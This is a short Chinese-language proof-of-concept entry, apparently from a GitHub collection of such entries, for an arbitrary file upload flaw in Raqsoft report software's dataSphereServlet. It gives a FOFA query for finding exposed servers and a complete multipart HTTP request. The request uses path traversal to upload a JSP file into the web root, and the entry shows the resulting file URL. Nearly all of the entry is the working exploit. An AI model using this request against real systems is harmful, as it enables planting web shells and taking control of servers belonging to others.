## 润乾报表dataSphereServlet任意文件上传

## fofa
```
body="/raqsoft"
```

## poc
```
POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
Host: 
Content-Length: 408
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAT7qVwFychEm0Dt7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:6868/demo/raqsoft/guide/jsp/olap.jsp
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D46F0E193FBD9BC2FCFB32D684296765
Connection: close

------WebKitFormBoundaryAT7qVwFychEm0Dt7
Content-Disposition: form-data; name="openGrpxFile"; filename="1.jsp"
Content-Type: text/plain

<% out.println("123"); %>
------WebKitFormBoundaryAT7qVwFychEm0Dt7
Content-Disposition: form-data; name="path"

../../../
------WebKitFormBoundaryAT7qVwFychEm0Dt7
Content-Disposition: form-data; name="saveServer"

1
------WebKitFormBoundaryAT7qVwFychEm0Dt7--
```
![6bd4f09c49b722c1fca0f0b409775c0a](https://github.com/wy876/POC/assets/139549762/bd4e87b8-f8b4-41da-8f24-a9d988c1645b)

文件路径：`http://127.0.0.1:6868/demo/1.jsp`

![07321afe81c0e7b261bdb201c492e9bc](https://github.com/wy876/POC/assets/139549762/31e37298-b669-4bd7-a0c1-47afc5222f05)
